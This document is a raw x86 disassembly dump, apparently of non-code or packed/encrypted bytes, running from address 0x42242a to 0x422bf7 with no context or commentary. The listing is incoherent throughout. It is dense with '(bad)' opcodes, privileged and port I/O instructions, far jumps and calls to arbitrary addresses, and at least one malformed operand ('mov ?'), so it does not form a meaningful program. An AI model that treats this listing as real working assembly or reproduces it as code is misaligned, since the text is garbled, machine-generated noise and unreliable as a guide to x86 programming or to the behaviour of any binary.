  42242a:	aad    0x5b
  42242c:	or     BYTE PTR [ebp-0x8],ah
  42242f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422430:	push   0x69
  422432:	add    ebp,DWORD PTR [ecx]
  422434:	call   0x8f1eb4d6
  422439:	jbe    0x422454
  42243b:	outs   dx,BYTE PTR ds:[esi]
  42243c:	xchg   eax,eax
  42243e:	adc    eax,0xcf5b49f9
  422443:	out    dx,al
  422444:	in     al,dx
  422445:	loop   0x422460
  422447:	retf   
  422448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422449:	mov    ch,BYTE PTR [edi-0x2fd952fc]
  42244f:	dec    esp
  422450:	xchg   ebx,eax
  422451:	cld    
  422452:	mov    ecx,0xf048b88f
  422457:	mov    bh,0xfd
  422459:	push   edi
  42245a:	xchg   ecx,eax
  42245b:	mov    cl,0x77
  42245d:	repnz sub eax,ecx
  422460:	in     eax,0xab
  422462:	cld    
  422463:	movq   QWORD PTR [ebx-0x5e],mm4
  422467:	fnstsw WORD PTR [eax]
  422469:	add    eax,0x86a8190f
  42246e:	cdq    
  42246f:	mov    bh,0xc2
  422471:	int3   
  422472:	mov    esp,0xef554f6a
  422477:	push   edx
  422478:	xchg   ebx,eax
  422479:	imul   ebx,DWORD PTR [ebx-0x36],0xffffffe7
  42247d:	dec    esp
  42247e:	hlt    
  42247f:	and    eax,0x864e2db2
  422484:	sbb    esi,0x5227292b
  42248a:	xchg   edx,eax
  42248b:	mov    eax,ds:0xeb70ba34
  422490:	enter  0x811d,0xa
  422494:	test   DWORD PTR [edx+ebp*4-0x77],ebx
  422498:	lock inc edx
  42249a:	(bad)  
  42249b:	push   eax
  42249c:	cld    
  42249d:	dec    ecx
  42249e:	bound  ebp,QWORD PTR [esi+0x1]
  4224a1:	jle    0x4224e2
  4224a3:	lods   eax,DWORD PTR ds:[esi]
  4224a4:	aam    0x60
  4224a6:	fsub   DWORD PTR [edi+0x6e]
  4224a9:	js     0x42250a
  4224ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ac:	mov    BYTE PTR [edx+esi*2-0x5e],bh
  4224b0:	push   0x5324680c
  4224b5:	test   DWORD PTR [ecx+0x1],ebp
  4224b8:	ficom  DWORD PTR [esi+0x58fe60b0]
  4224be:	arpl   WORD PTR [ecx+ebp*8+0xb],dx
  4224c2:	jg     0x42250a
  4224c4:	and    dl,ch
  4224c6:	sub    al,0xfb
  4224c8:	sub    al,0x4e
  4224ca:	fild   WORD PTR gs:[ebx]
  4224cd:	jg     0x4224f7
  4224cf:	cmp    ch,BYTE PTR [esp+esi*1+0x1be60453]
  4224d6:	inc    ebx
  4224d7:	fldenv [ebx-0x46]
  4224da:	neg    DWORD PTR [ebx]
  4224dc:	inc    esp
  4224dd:	je     0x42250d
  4224df:	mov    fs,WORD PTR [eax]
  4224e1:	sbb    al,0x18
  4224e3:	mov    eax,0x9836a270
  4224e8:	dec    ebp
  4224e9:	rcr    ebx,0xf3
  4224ec:	mov    ds:0x52c9cc15,eax
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	mov    esi,0x95d6bcb
  4224f7:	xchg   DWORD PTR [ebx-0x6ef74f86],ebp
  4224fd:	mov    dh,0x53
  4224ff:	(bad)  
  422500:	loope  0x42249c
  422502:	pfmin  mm3,QWORD PTR [edi+0x633869f5]
  42250a:	dec    ebx
  42250b:	adc    al,0x8
  42250d:	add    eax,0x5cb967e7
  422512:	call   0xb98b8de
  422517:	in     al,0xca
  422519:	pop    ebp
  42251a:	dec    edx
  42251b:	add    BYTE PTR [ebx],dh
  42251d:	in     al,dx
  42251e:	aas    
  42251f:	jns    0x4224f6
  422521:	jp     0x4224bb
  422523:	addr16 iret 
  422525:	pop    ebp
  422526:	sti    
  422527:	lahf   
  422528:	or     esi,DWORD PTR [ecx-0x4b]
  42252b:	and    DWORD PTR [ecx-0x43003574],0x23
  422532:	fcom   DWORD PTR [ecx]
  422534:	call   0xb1b4:0x27f78e08
  42253b:	adc    BYTE PTR [eax],bh
  42253d:	int    0xe5
  42253f:	sbb    ebx,DWORD PTR [ebp-0x1d]
  422542:	lods   al,BYTE PTR ds:[esi]
  422543:	ret    0x4187
  422546:	fimul  DWORD PTR [ebp-0x29]
  422549:	adc    DWORD PTR [esi-0x4f],0x9eeb6f4e
  422550:	push   eax
  422551:	in     eax,dx
  422552:	fidivr WORD PTR [esi]
  422554:	fcomip st,st(2)
  422556:	jecxz  0x422577
  422558:	shl    DWORD PTR [ecx+ebp*1+0x549c9991],0x9e
  422560:	cmp    ecx,DWORD PTR [ecx-0x6a]
  422563:	mov    dh,0x8f
  422565:	daa    
  422566:	lods   al,BYTE PTR ds:[esi]
  422567:	ja     0x422515
  422569:	shl    dh,cl
  42256b:	or     DWORD PTR ds:0x8178cfdc,eax
  422571:	adc    edx,DWORD PTR [edx]
  422573:	inc    eax
  422574:	cdq    
  422575:	lods   eax,DWORD PTR ds:[esi]
  422576:	(bad)  
  422577:	xchg   ebp,eax
  422578:	xchg   esi,eax
  422579:	mov    esp,0x6acbc043
  42257e:	mov    ds:0xfa15eeb4,eax
  422583:	add    BYTE PTR [ecx],bl
  422585:	sbb    BYTE PTR [ecx+0x79],ch
  422588:	mov    ds:0x438a497e,eax
  42258d:	in     eax,dx
  42258e:	inc    esp
  42258f:	enter  0xef66,0x2b
  422593:	mov    ecx,0xcd8913fc
  422598:	ins    BYTE PTR es:[edi],dx
  422599:	(bad)  
  42259a:	sti    
  42259b:	fsqrt  
  42259d:	or     BYTE PTR [ebp+0x76],ah
  4225a0:	mov    eax,0x34a6c76e
  4225a5:	mov    cl,0x5d
  4225a7:	aam    0x21
  4225a9:	xor    esp,DWORD PTR [esi-0xc25945e]
  4225af:	repz xchg edx,eax
  4225b1:	aam    0xd5
  4225b3:	les    ebx,FWORD PTR [edi-0x5b]
  4225b6:	pop    edx
  4225b7:	int    0xe2
  4225b9:	popa   
  4225ba:	mov    cl,0xb5
  4225bc:	jge    0x42258e
  4225be:	dec    ebx
  4225bf:	cdq    
  4225c0:	not    BYTE PTR [edi-0x66]
  4225c3:	jns    0x422580
  4225c5:	imul   DWORD PTR [esi]
  4225c7:	push   ecx
  4225c8:	int    0x1a
  4225ca:	scas   al,BYTE PTR es:[edi]
  4225cb:	jbe    0x4225b7
  4225cd:	xchg   ebx,eax
  4225ce:	fsub   st,st(0)
  4225d0:	jo     0x422640
  4225d2:	and    eax,0x9631862c
  4225d7:	ficom  WORD PTR [edi+0x49]
  4225da:	xor    bl,bh
  4225dc:	sub    ebx,DWORD PTR [ebp+0x3]
  4225df:	rol    edx,cl
  4225e1:	stos   BYTE PTR es:[edi],al
  4225e2:	(bad)  
  4225e3:	int    0x25
  4225e5:	ins    BYTE PTR es:[edi],dx
  4225e6:	jb     0x4225c4
  4225e8:	jnp    0x4225a2
  4225ea:	jno    0x42264e
  4225ec:	cmp    eax,0x3c5bc183
  4225f1:	cmc    
  4225f2:	push   0x58
  4225f4:	fsubr  DWORD PTR [esi+0x70]
  4225f7:	lods   al,BYTE PTR ds:[esi]
  4225f8:	shr    DWORD PTR [edx+eiz*8],0x7a
  4225fc:	inc    edi
  4225fd:	cs jb  0x42258e
  422600:	push   esi
  422601:	jmp    0x326ca364
  422606:	mov    cl,0xf4
  422608:	int    0xd2
  42260a:	hlt    
  42260b:	jmp    0x4225f7
  42260d:	lds    esp,FWORD PTR [ecx+edi*2-0x63]
  422611:	cmp    bl,BYTE PTR [ebp+0x7dfbbc4e]
  422617:	int3   
  422618:	mov    dh,ah
  42261a:	(bad)
  42261e:	push   ebp
  42261f:	mov    edx,0xbbfd5c42
  422624:	ds xchg ebp,eax
  422626:	sub    ch,dl
  422628:	add    al,0xd0
  42262a:	(bad)  
  42262b:	loope  0x4225ca
  42262d:	pop    eax
  42262e:	push   ebx
  42262f:	fdivr  DWORD PTR [edi]
  422631:	or     al,BYTE PTR [edi-0xcf32560]
  422637:	bound  ebp,QWORD PTR [ebp+ebx*1+0xe61b9c4]
  42263e:	push   ebp
  42263f:	dec    edx
  422640:	in     eax,0x57
  422642:	adc    DWORD PTR [esi+0x7e],eax
  422645:	xchg   DWORD PTR [ecx+0x6b065c0e],edx
  42264b:	out    dx,eax
  42264c:	pop    ds
  42264d:	xchg   ebx,eax
  42264e:	cli    
  42264f:	inc    ecx
  422650:	jle    0x422613
  422652:	iret   
  422653:	mov    ah,0xe6
  422655:	mov    ch,0xb3
  422657:	data16 icebp 
  422659:	pop    edi
  42265a:	adc    dh,BYTE PTR [eax]
  42265c:	rol    BYTE PTR [esi+ecx*2+0x7e4c2e20],0xd8
  422664:	mov    ds:0x3ea4f9db,eax
  422669:	mov    bl,0xec
  42266b:	pop    ds
  42266c:	ret    
  42266d:	jle    0x422647
  42266f:	mov    esp,0xb15aab47
  422674:	mov    al,ds:0x2c31a141
  422679:	add    al,0x8
  42267b:	push   0xffffffd6
  42267d:	ret    0x95d9
  422680:	enter  0x8a3c,0x42
  422684:	int    0xda
  422686:	repnz cmp bh,al
  422689:	je     0x4226f6
  42268b:	(bad)  
  42268c:	mov    dl,0xab
  42268e:	frstor [edi-0x6]
  422691:	push   es
  422692:	lahf   
  422693:	and    al,BYTE PTR [esi+0x6c5c0571]
  422699:	adc    DWORD PTR [ecx-0x10d70651],esp
  42269f:	or     eax,0xa7137579
  4226a4:	cmp    ebp,esp
  4226a6:	adc    DWORD PTR [eax+0x22],edi
  4226a9:	(bad)  
  4226aa:	retf   
  4226ab:	mov    ch,BYTE PTR [edx-0x2bee61e6]
  4226b1:	fwait
  4226b2:	les    edx,FWORD PTR [ecx]
  4226b4:	and    BYTE PTR [eax-0x247ba00],dh
  4226ba:	ins    BYTE PTR es:[edi],dx
  4226bb:	mov    ecx,esi
  4226bd:	arpl   WORD PTR [edi+0x678774a],bx
  4226c3:	and    al,dh
  4226c5:	out    0x65,eax
  4226c7:	ror    esp,1
  4226c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ca:	cmp    edi,DWORD PTR [eax-0x2a]
  4226cd:	xor    eax,0x74f89bc2
  4226d2:	(bad)  
  4226d3:	scas   al,BYTE PTR es:[edi]
  4226d4:	inc    ecx
  4226d5:	sub    al,0xa8
  4226d7:	mov    DWORD PTR [ebp+0x52765f9a],edi
  4226dd:	hlt    
  4226de:	dec    ebx
  4226df:	mov    al,ds:0xd57c7781
  4226e4:	xchg   edi,eax
  4226e5:	mov    edi,0xcc61266f
  4226ea:	jge    0x422696
  4226ec:	mov    esi,0xede50471
  4226f1:	sub    ebx,DWORD PTR [esi+0x55a9dea3]
  4226f7:	fisubr DWORD PTR [esi-0x69]
  4226fa:	ins    BYTE PTR es:[edi],dx
  4226fb:	les    esi,FWORD PTR [ebp+0x11]
  4226fe:	or     al,0xdb
  422700:	jmp    0xca09:0xb7135724
  422707:	cli    
  422708:	adc    eax,0xd52437f7
  42270d:	jle    0x422758
  42270f:	aas    
  422710:	out    0xb5,al
  422712:	popf   
  422713:	xchg   edi,eax
  422714:	sub    DWORD PTR [ecx+0x53],eax
  422717:	push   ss
  422718:	test   BYTE PTR [esi+0x110b43ea],al
  42271e:	cmp    al,0xc3
  422720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422721:	fadd   DWORD PTR [ebx+0x13b89b3e]
  422727:	fadd   QWORD PTR [ebx+0xe]
  42272a:	and    dh,al
  42272c:	push   0x10b3bdfb
  422731:	xchg   ebx,eax
  422732:	repnz popa 
  422734:	dec    ecx
  422735:	(bad)  
  422736:	loopne 0x4226f9
  422738:	(bad)  
  422739:	pop    ebp
  42273a:	aas    
  42273b:	jecxz  0x422718
  42273d:	loop   0x42271a
  42273f:	cli    
  422740:	or     DWORD PTR [eax-0x58],0x7c
  422744:	cld    
  422745:	inc    eax
  422746:	dec    esp
  422747:	out    0x60,eax
  422749:	xchg   edx,eax
  42274a:	in     eax,dx
  42274b:	push   cs
  42274c:	jmp    0x3b980730
  422751:	rol    DWORD PTR [esi+0x5d],1
  422754:	js     0x42272d
  422756:	rcr    DWORD PTR [eax],0x80
  422759:	call   0xd4df67d
  42275e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42275f:	push   ebx
  422760:	ficomp DWORD PTR [eax+0x13a6ce0f]
  422766:	scas   al,BYTE PTR es:[edi]
  422767:	fcmove st,st(4)
  422769:	loopne 0x4227c5
  42276b:	push   ebx
  42276c:	jmp    0x9998e623
  422771:	mov    bl,BYTE PTR [ebp-0xb18117c]
  422777:	cwde   
  422778:	rcr    DWORD PTR [ebx-0x3856efb6],1
  42277e:	xchg   edi,eax
  42277f:	push   esp
  422780:	aam    0x87
  422782:	fistp  DWORD PTR [edx+0x60]
  422785:	jge    0x42271f
  422787:	and    eax,0x94a8a6d1
  42278c:	out    0x7,eax
  42278e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42278f:	mov    eax,ds:0x9a6d2a7e
  422794:	mov    eax,ds:0xb371555b
  422799:	fs pop es
  42279b:	clc    
  42279c:	es in  eax,dx
  42279e:	out    0x65,al
  4227a0:	adc    al,0xc6
  4227a2:	gs jb  0x42281c
  4227a5:	mov    bh,0x3b
  4227a7:	out    dx,al
  4227a8:	sub    al,0x32
  4227aa:	jmp    0x4227ff
  4227ac:	mov    WORD PTR ds:0xa8ebe61a,fs
  4227b2:	and    bl,BYTE PTR [edi]
  4227b4:	jg     0x4227d2
  4227b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b7:	popa   
  4227b8:	jecxz  0x422749
  4227ba:	sbb    eax,0xeb397fc7
  4227bf:	es out dx,eax
  4227c1:	xchg   ecx,eax
  4227c2:	sbb    DWORD PTR [esi+0x39],0x1253ab3a
  4227c9:	mov    ebx,0x305ebc88
  4227ce:	xchg   ebp,eax
  4227cf:	xor    al,0x5a
  4227d1:	inc    ebp
  4227d2:	pop    es
  4227d3:	add    BYTE PTR [edi+0x504154fa],bl
  4227d9:	mov    ds:0x3230135d,al
  4227df:	fistp  QWORD PTR [ecx+0x77]
  4227e2:	jmp    0x42283c
  4227e4:	xchg   edx,eax
  4227e5:	xchg   ebx,eax
  4227e6:	std    
  4227e7:	jmp    0x1415e9a0
  4227ec:	test   DWORD PTR ds:0xaa0aebaa,ebx
  4227f2:	xor    DWORD PTR [ebp+0x6ddedb14],esi
  4227f8:	or     edx,DWORD PTR ds:[ebp-0x50]
  4227fc:	ds mov bl,0x89
  4227ff:	scas   al,BYTE PTR es:[edi]
  422800:	push   ds
  422801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422802:	dec    ecx
  422803:	jbe    0x42284f
  422805:	jge    0x4227e3
  422807:	mov    cl,0xb7
  422809:	cmc    
  42280a:	mov    esp,0xa23d0f3
  42280f:	adc    edx,DWORD PTR [eax+eiz*1+0x3f]
  422813:	xor    al,0xca
  422815:	jge    0x4227b2
  422817:	ds es jno 0x4227c6
  42281b:	popf   
  42281c:	mov    eax,ds:0xee9f462f
  422821:	ds out 0x65,eax
  422824:	sbb    al,0x15
  422826:	inc    edx
  422827:	xchg   esi,eax
  422828:	je     0x4227bd
  42282a:	and    ebx,ecx
  42282c:	mov    DWORD PTR [esi+0x67807835],edx
  422832:	sti    
  422833:	test   eax,0xf0bfe322
  422838:	add    ebp,eax
  42283a:	add    cl,BYTE PTR [ebx-0x7d]
  42283d:	push   ecx
  42283e:	mov    edx,0xa1c3dc1a
  422843:	mov    esp,0x7d452462
  422848:	cs jae 0x42285c
  42284b:	pop    esi
  42284c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42284d:	invd   
  42284f:	dec    ebp
  422850:	xchg   edi,eax
  422851:	cld    
  422852:	std    
  422853:	adc    edi,DWORD PTR [edi-0xc53bf98]
  422859:	add    al,0x59
  42285b:	mov    ds:0x6f7c5e9a,eax
  422860:	sub    ebx,edi
  422862:	iret   
  422863:	sti    
  422864:	add    BYTE PTR [ebp-0x6b062a82],ah
  42286a:	push   edi
  42286b:	repnz xlat BYTE PTR ds:[ebx]
  42286d:	mov    al,0xdc
  42286f:	push   ebp
  422870:	sub    DWORD PTR [eax+ebp*1],ebx
  422873:	pop    ecx
  422874:	inc    ebx
  422875:	xchg   edx,eax
  422876:	or     al,BYTE PTR [ebp-0x3c]
  422879:	xchg   DWORD PTR [edx+0x1aa6d018],ebp
  42287f:	inc    edx
  422880:	dec    esp
  422881:	jl     0x4228e1
  422883:	push   es
  422884:	fwait
  422885:	push   eax
  422886:	jno    0x422872
  422888:	ins    BYTE PTR es:[edi],dx
  422889:	mov    esp,0x9d91cb4c
  42288e:	mov    ds:0xf5b4211,al
  422893:	sti    
  422894:	out    0x99,eax
  422896:	push   ebx
  422897:	mov    cl,BYTE PTR ss:[edx+0x1d]
  42289b:	int    0xa3
  42289d:	cmp    ebx,DWORD PTR [edi+0x29]
  4228a0:	(bad)  
  4228a2:	push   edx
  4228a3:	xchg   ebp,eax
  4228a4:	outs   dx,DWORD PTR ds:[esi]
  4228a5:	ins    BYTE PTR es:[edi],dx
  4228a6:	xor    DWORD PTR gs:0xff318923,ecx
  4228ad:	(bad)  
  4228ae:	out    dx,eax
  4228af:	xchg   BYTE PTR [eax+eax*1],bh
  4228b2:	es (bad) 
  4228b4:	lahf   
  4228b5:	fidivr DWORD PTR [ebx-0x60]
  4228b8:	loopne 0x4228c6
  4228ba:	imul   BYTE PTR [eax-0xf]
  4228bd:	cmp    edi,ebp
  4228bf:	fidivr WORD PTR [eax]
  4228c1:	(bad)  
  4228c2:	pop    ds
  4228c3:	fs xchg esi,eax
  4228c5:	imul   esi,DWORD PTR [ecx+0x6bd564a8],0x7c
  4228cc:	and    DWORD PTR [esi-0x3b],0x59
  4228d0:	loope  0x422948
  4228d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228d3:	js     0x422941
  4228d5:	mov    esp,0x2fc18dd
  4228da:	daa    
  4228db:	push   ss
  4228dc:	repz xor DWORD PTR [ebp-0x35b455c1],esp
  4228e3:	into   
  4228e4:	loopne 0x4228e4
  4228e6:	in     eax,dx
  4228e7:	mov    bl,0xfd
  4228e9:	repz and eax,0x9a8b196f
  4228ef:	push   0xbaf98bc0
  4228f4:	mov    eax,ds:0xc734509f
  4228f9:	xchg   DWORD PTR [ecx],edx
  4228fb:	jmp    0x4228c9
  4228fd:	test   eax,0x23610e2b
  422902:	jmp    0x4228a6
  422904:	loope  0x422968
  422906:	push   esp
  422907:	xor    al,0xd
  422909:	mov    bh,0x3
  42290b:	(bad)  
  42290c:	icebp  
  42290d:	int3   
  42290e:	push   0x33
  422910:	jns    0x4228ad
  422912:	cwde   
  422913:	test   eax,0x61b79d3b
  422918:	inc    eax
  422919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291a:	ret    
  42291b:	push   edi
  42291c:	mov    eax,ds:0x961e45fd
  422921:	inc    ebp
  422922:	lea    edi,[ebx+0x5dbb8609]
  422928:	add    dl,BYTE PTR [edx]
  42292a:	nop
  42292b:	sbb    ecx,DWORD PTR [ecx+0x17]
  42292e:	and    BYTE PTR [ecx-0x71],0x1
  422932:	and    BYTE PTR [ebp-0x5983e02],al
  422938:	ins    BYTE PTR es:[edi],dx
  422939:	leave  
  42293a:	daa    
  42293b:	pushf  
  42293c:	icebp  
  42293d:	daa    
  42293e:	mov    ebx,0xdc9a2d7f
  422943:	ins    BYTE PTR es:[edi],dx
  422944:	xchg   ecx,esi
  422946:	jmp    FWORD PTR [ebx+0x6289f85]
  42294c:	ds out 0x38,al
  42294f:	(bad)  
  422950:	outs   dx,DWORD PTR ds:[esi]
  422951:	pop    ss
  422952:	rcl    dl,1
  422954:	jb     0x4229cb
  422956:	ss cmp al,0xb8
  422959:	std    
  42295a:	lahf   
  42295b:	adc    edx,DWORD PTR [esi+0x443c5f8c]
  422961:	add    DWORD PTR [eax+0xaad1d3e],0x7c
  422968:	jnp    0x422928
  42296a:	lods   eax,DWORD PTR ds:[esi]
  42296b:	shl    DWORD PTR [eax-0x13626fc0],0xf6
  422972:	mov    ecx,0x4d32159c
  422977:	dec    edx
  422978:	in     al,0x29
  42297a:	sbb    BYTE PTR [esi+0x6b],0x65
  42297e:	out    0x18,eax
  422980:	fdivr  DWORD PTR [edx-0x12]
  422983:	and    BYTE PTR [ecx-0x7b],ah
  422986:	push   ebx
  422987:	cmp    DWORD PTR [eax],edi
  422989:	jg     0x4229ff
  42298b:	cmp    ebx,DWORD PTR [eax+0x6a0f9afb]
  422991:	and    BYTE PTR ds:0x29766432,dh
  422997:	pop    esi
  422998:	(bad)  
  422999:	mov    ecx,0xd9c84d64
  42299e:	or     DWORD PTR [eax+0x19],ecx
  4229a1:	cmp    eax,0xe9a230fe
  4229a6:	adc    edx,DWORD PTR [ebp+0xc]
  4229a9:	or     eax,0xab2f3c97
  4229ae:	shr    DWORD PTR [esi+0x2b],cl
  4229b1:	jbe    0x422a11
  4229b3:	jb     0x42293b
  4229b5:	add    edi,ebx
  4229b7:	in     al,dx
  4229b8:	xor    ecx,esi
  4229ba:	(bad)  
  4229bb:	lock sysret 
  4229be:	jbe    0x422984
  4229c0:	sub    DWORD PTR [edi-0x51940af4],0xb0e00959
  4229ca:	sub    bl,cl
  4229cc:	shl    eax,1
  4229ce:	mov    DWORD PTR [ecx],edx
  4229d0:	(bad)  
  4229d1:	enter  0x50e0,0x2c
  4229d5:	add    BYTE PTR [esp+eiz*8-0x2b6c7726],0x9e
  4229dd:	pop    ecx
  4229de:	mov    eax,0x6de012a6
  4229e3:	jae    0x42296a
  4229e5:	mov    WORD PTR [esi+0x1129cf40],ss
  4229eb:	out    0x95,eax
  4229ed:	cs jg  0x422a36
  4229f0:	test   eax,0x85e6a1dc
  4229f5:	out    dx,al
  4229f6:	mov    ds:0x93ea1cc5,al
  4229fb:	add    eax,0xcf1d1f40
  422a00:	xor    al,0x39
  422a02:	leave  
  422a03:	push   eax
  422a04:	pop    ds
  422a05:	ficomp WORD PTR [ecx]
  422a07:	stos   BYTE PTR es:[edi],al
  422a08:	and    DWORD PTR [eax+0x7c8edb32],0xe268eef0
  422a12:	cmp    edx,esp
  422a14:	hlt    
  422a15:	ds or  eax,0x5320da82
  422a1b:	push   edi
  422a1c:	out    dx,al
  422a1d:	xchg   esi,eax
  422a1e:	pop    eax
  422a1f:	cmp    DWORD PTR [edx+ebx*1],edi
  422a22:	mov    ah,0x68
  422a24:	cmp    al,0x4c
  422a26:	pushf  
  422a27:	or     ebp,DWORD PTR [esi]
  422a29:	mov    ah,0x61
  422a2b:	fwait
  422a2c:	mov    BYTE PTR [esi-0x3fabd5e4],ah
  422a32:	fbld   TBYTE PTR [ecx]
  422a34:	lds    ecx,FWORD PTR [ecx+0x28]
  422a37:	and    BYTE PTR [ecx+edi*1],0x84
  422a3b:	inc    ebx
  422a3c:	jge    0x422a36
  422a3e:	xchg   esp,eax
  422a3f:	popf   
  422a40:	inc    esi
  422a41:	jmp    0x422a06
  422a43:	mov    ah,0x8b
  422a45:	mov    bh,ah
  422a47:	cwde   
  422a48:	or     eax,edx
  422a4a:	cli    
  422a4b:	inc    eax
  422a4c:	loope  0x422a85
  422a4e:	rcr    DWORD PTR [ebx-0x769afbb7],0x75
  422a55:	out    0xf4,eax
  422a57:	test   DWORD PTR [ebx-0x36],0xd543f04c
  422a5e:	add    dl,BYTE PTR [ebx]
  422a60:	dec    edx
  422a61:	xchg   ebx,eax
  422a62:	mov    cl,0xc7
  422a64:	int    0x1f
  422a66:	std    
  422a67:	pop    es
  422a68:	(bad)  
  422a69:	and    ch,bl
  422a6b:	mov    esi,ebp
  422a6d:	lods   eax,DWORD PTR ds:[esi]
  422a6e:	cmc    
  422a6f:	adc    BYTE PTR [ebx],0x28
  422a72:	jmp    0x422a30
  422a74:	push   sp
  422a76:	cs inc ecx
  422a78:	nop
  422a79:	cdq    
  422a7a:	clc    
  422a7b:	xor    edx,ebp
  422a7d:	icebp  
  422a7e:	dec    edi
  422a80:	ficomp WORD PTR [esi-0x6be4481c]
  422a86:	xchg   esp,eax
  422a87:	mov    BYTE PTR [edx],bh
  422a89:	test   edi,eax
  422a8b:	and    bh,BYTE PTR [esi]
  422a8d:	shl    ch,1
  422a8f:	push   0xffffffdf
  422a91:	xchg   ebp,eax
  422a92:	cmp    dl,BYTE PTR [esi+0x665543e1]
  422a98:	cs call 0xfe1f:0xbe2873ef
  422aa0:	xchg   edi,eax
  422aa1:	xor    ah,al
  422aa3:	xchg   esi,eax
  422aa4:	imul   ebx,DWORD PTR [esi+edi*1],0x5f
  422aa8:	push   cs
  422aa9:	pop    edx
  422aaa:	jg     0x422b17
  422aac:	push   ds
  422aad:	sub    al,0x4b
  422aaf:	push   eax
  422ab0:	leave  
  422ab1:	(bad)  
  422ab2:	mov    eax,0xe2047a6d
  422ab7:	pop    es
  422ab8:	cwde   
  422ab9:	cmp    al,0xb
  422abb:	int3   
  422abc:	in     eax,dx
  422abd:	add    BYTE PTR [ebp-0x6451cf45],ah
  422ac3:	call   0x8e01:0x5562be70
  422aca:	inc    eax
  422acb:	and    al,0x86
  422acd:	je     0x422aba
  422acf:	push   eax
  422ad0:	aaa    
  422ad1:	cwde   
  422ad2:	stos   DWORD PTR es:[edi],eax
  422ad3:	pop    ecx
  422ad4:	mov    esp,0xfbb3b76c
  422ad9:	mov    eax,ds:0x3a5b48ca
  422ade:	jp     0x422b37
  422ae0:	sub    DWORD PTR [ebp+0x4a1efa7e],ecx
  422ae6:	lock fs pop esi
  422ae9:	gs cld 
  422aeb:	pop    ss
  422aec:	mov    ebp,0xc3c3fae9
  422af1:	sar    esi,0xf0
  422af4:	stos   BYTE PTR es:[edi],al
  422af5:	hlt    
  422af6:	or     ebp,DWORD PTR [edx]
  422af8:	aas    
  422af9:	daa    
  422afa:	mov    ecx,0xbf360f7
  422aff:	push   0xffffffe3
  422b01:	sub    esp,edx
  422b03:	leave  
  422b04:	(bad)  
  422b05:	pop    ecx
  422b06:	leave  
  422b07:	pop    eax
  422b08:	pop    edi
  422b09:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  422b0b:	js     0x422b0d
  422b0d:	xchg   edx,eax
  422b0e:	les    ecx,FWORD PTR [eax]
  422b10:	mov    al,0x3d
  422b12:	jg     0x422b3c
  422b14:	ror    ah,cl
  422b16:	outs   dx,DWORD PTR ds:[esi]
  422b17:	push   esi
  422b18:	and    eax,0x8a789ece
  422b1d:	sbb    BYTE PTR [ebx+eax*1],al
  422b20:	es cmc 
  422b22:	inc    ebx
  422b23:	mov    edi,0x9a817811
  422b28:	xor    esi,DWORD PTR [ecx-0x2a]
  422b2b:	retf   0x91dd
  422b2e:	inc    si
  422b30:	and    eax,0xf843de76
  422b35:	out    dx,al
  422b36:	test   al,0x51
  422b38:	add    esi,DWORD PTR [ecx]
  422b3a:	cmp    dh,cl
  422b3c:	in     al,dx
  422b3d:	aaa    
  422b3e:	lahf   
  422b3f:	fs (bad) 
  422b41:	cmp    DWORD PTR [esi-0x15237f77],ebx
  422b47:	lods   al,BYTE PTR ds:[esi]
  422b48:	mov    dl,0xe3
  422b4a:	jmp    0x35611f7e
  422b4f:	cli    
  422b50:	iret   
  422b51:	rsqrtps xmm6,XMMWORD PTR [ebx]
  422b54:	shl    DWORD PTR [eax-0x36905eb5],cl
  422b5a:	or     eax,0xf5879955
  422b5f:	push   esi
  422b60:	xchg   edx,eax
  422b61:	mov    ?,WORD PTR [ebx]
  422b63:	and    BYTE PTR [esi+0x36563c58],dl
  422b69:	sbb    edi,esi
  422b6b:	nop
  422b6c:	sbb    ebx,DWORD PTR [edx]
  422b6e:	ss or  al,0x4e
  422b71:	pop    ds
  422b72:	jg     0x422b4c
  422b74:	and    DWORD PTR [eax+0x2961846a],esi
  422b7a:	loope  0x422b70
  422b7c:	pop    ebp
  422b7d:	sbb    BYTE PTR [ebp+edi*8-0x3b0d6498],bh
  422b84:	jmp    0x7a7f:0x6bc68c52
  422b8b:	std    
  422b8c:	jp     0x422b4e
  422b8e:	test   BYTE PTR [esi-0x10],dh
  422b91:	inc    edx
  422b92:	add    al,0xe0
  422b94:	mov    ds:0x4f85d88e,al
  422b99:	int    0xd8
  422b9b:	mov    cl,0xb9
  422b9d:	out    0x28,eax
  422b9f:	test   edi,ebp
  422ba1:	xchg   DWORD PTR [edx+ecx*4+0x2867d12c],esi
  422ba8:	and    al,dl
  422baa:	mov    DWORD PTR [eax],ebp
  422bac:	or     ebp,ebp
  422bae:	mov    esi,0xb5b7fb40
  422bb3:	leave  
  422bb4:	cs sub ch,dl
  422bb7:	repz adc eax,0x5b297e6a
  422bbd:	add    al,0xba
  422bbf:	and    DWORD PTR [ecx],edi
  422bc1:	jecxz  0x422c07
  422bc3:	arpl   dx,si
  422bc5:	loopne 0x422b79
  422bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bc8:	or     ecx,edx
  422bca:	fcomp  st(1)
  422bcc:	mov    dh,0x5c
  422bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bcf:	mov    edi,cs
  422bd1:	mov    bl,0x17
  422bd3:	mov    edi,0x72b6dd4e
  422bd8:	and    BYTE PTR [ecx],dl
  422bda:	test   DWORD PTR [edi],edi
  422bdc:	dec    edx
  422bdd:	add    BYTE PTR [eax+0x329cc6b1],al
  422be3:	sbb    BYTE PTR [edi+ebp*4+0x3d96b65c],dh
  422bea:	cli    
  422beb:	pop    edi
  422bec:	inc    edx
  422bed:	pop    ebx
  422bee:	jae    0x422c34
  422bf0:	cdq    
  422bf1:	adc    al,0x3
  422bf3:	or     BYTE PTR [esi+0x69],0xac
  422bf7:	int3   
